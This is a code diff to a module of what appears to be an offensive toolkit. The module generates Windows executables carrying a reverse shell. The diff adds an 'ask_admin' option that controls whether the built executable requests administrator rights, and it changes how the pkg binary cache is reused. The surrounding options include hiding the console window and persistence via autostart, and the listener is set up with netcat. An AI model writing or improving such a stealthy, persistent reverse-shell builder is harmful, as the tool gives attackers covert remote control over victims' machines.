@@ -12,7 +12,6 @@ import { cmdWarn } from '../../utils/cmd';
 
 // save the path to pkg cache folder
 const cachePath = path.join(__dirname, '../../pkg-cache');
-let PKG_CACHE_VERSION;
 
 export default class ReverseShellModule extends Module {
     description = 'Generate an exe with reverse shell in it.';
@@ -27,6 +26,7 @@ export default class ReverseShellModule extends Module {
     mergeFilePath = '';
     hostCmd = `nc -n 127.0.0.1 -l ${this.listenPort}`;
     waitRun = 0;
+    askAdmin: 'true' | 'false' = 'false';
     
     public args = [
         {
@@ -63,6 +63,11 @@ export default class ReverseShellModule extends Module {
             arg: 'run_silent=',
             desc: "Should the exe hide the console window. Default is true.",
             handler: this.handleSetSilent
+        },
+        {
+            arg: 'ask_admin=',
+            desc: "Should the exe require admin rights. Default is false.",
+            handler: this.handleSetAskAdmin
         },
         {
             arg: 'persist=',
@@ -114,7 +119,13 @@ export default class ReverseShellModule extends Module {
         else cmdWarn(`Error, run_silent= expects a true or false. Got: ${value}`);
     }
 
-    handleSetAutoStart(value){
+    handleSetAskAdmin(value) {
+        if(['true', 'false'].includes(value.toLowerCase()))
+        this.askAdmin = value.toLowerCase()
+        else cmdWarn(`Error, ask_admin= expects a true or false. Got: ${value}`);
+    }
+
+    handleSetAutoStart(value) {
         if(['true', 'false'].includes(value.toLowerCase()))
         this.isPersistent = value.toLowerCase()
         else cmdWarn(`Error, persist= expects a true or false. Got: ${value}`);
@@ -149,11 +160,13 @@ export default class ReverseShellModule extends Module {
         fs.writeFileSync(dummyJs, placeholder);
 
         // download pkg precompiled binaries
-        console.log('[log] - Downloading precompiled binaries...');
-        this.executePkg(dummyJs, 'temp.exe');
-        fs.unlinkSync(path.join(__dirname, `../../temp.exe`));
-        
-        PKG_CACHE_VERSION = fs.readdirSync(cachePath)[0];
+        if(fs.readdirSync(cachePath).length === 0){
+            console.log('[log] - Downloading precompiled binaries...');
+            this.executePkg(dummyJs, 'temp.exe');
+            fs.unlinkSync(path.join(__dirname, `../../temp.exe`));
+        }
+
+        const PKG_CACHE_VERSION = fs.readdirSync(cachePath)[0];
 
         // get path of fetched binary for windows
         const winBin = fs.readdirSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`)).find(f => f.includes('win'));
@@ -182,18 +195,16 @@ export default class ReverseShellModule extends Module {
         }
 
         // make the exe run as admin
-        console.log('[log] - Making the exe require admin rights...');
-        this.resourceHacker({
-            action: "addoverwrite",
-            open: finalExePath,
-            save: finalExePath,
-            resource: path.join(__dirname, './admin-manifest.res'),
-            mask: "MANIFEST",
-        });
-
-
-        // clear leftovers
-        fs.rmSync(path.join(cachePath, `./${PKG_CACHE_VERSION}`),{ recursive: true, force: true });
+        if(this.askAdmin.toLowerCase() == 'true'){
+            console.log('[log] - Making the exe require admin rights...');
+            this.resourceHacker({
+                action: "addoverwrite",
+                open: finalExePath,
+                save: finalExePath,
+                resource: path.join(__dirname, './admin-manifest.res'),
+                mask: "MANIFEST",
+            });
+        }
     }
 
     async handleListen() {
